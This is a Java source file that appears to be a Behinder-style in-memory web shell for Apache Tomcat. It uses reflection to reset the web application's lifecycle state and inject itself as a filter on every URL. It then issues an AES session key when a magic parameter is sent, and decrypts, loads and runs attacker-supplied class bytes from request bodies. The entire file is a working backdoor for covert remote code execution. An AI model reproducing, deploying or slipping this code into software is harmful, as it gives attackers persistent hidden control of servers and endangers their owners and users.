package com.xhstormr.app;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.util.LifecycleBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.EnumSet;
import java.util.UUID;

public class TomcatBehinderFilter extends ClassLoader implements Filter {

    public TomcatBehinderFilter() {
        super(Thread.currentThread().getContextClassLoader());
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse rsp = (HttpServletResponse) response;
            HttpSession session = req.getSession();

            if (req.getParameter("34aa503f95bb") != null) {
                String key = UUID.randomUUID().toString().replace("-", "").substring(16);
                session.setAttribute("u", key);
                rsp.getWriter().print(key);
                return;
            }

            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(session.getAttribute("u").toString().getBytes(), "AES"));
            byte[] bytes = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));

            new TomcatBehinderFilter().defineClass(null, bytes, 0, bytes.length).newInstance().equals(new Object[]{req, rsp});
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }

        chain.doFilter(request, response);
    }

    @Override
    public boolean equals(Object obj) {
        try {
            WebappClassLoaderBase classLoader = (WebappClassLoaderBase) obj;
            StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
            ServletContext servletContext = standardContext.getServletContext();

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            try {
                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                servletContext
                        .addFilter(UUID.randomUUID().toString(), this)
                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");

                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);

                stateField.set(standardContext, LifecycleState.STARTED);
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }
}
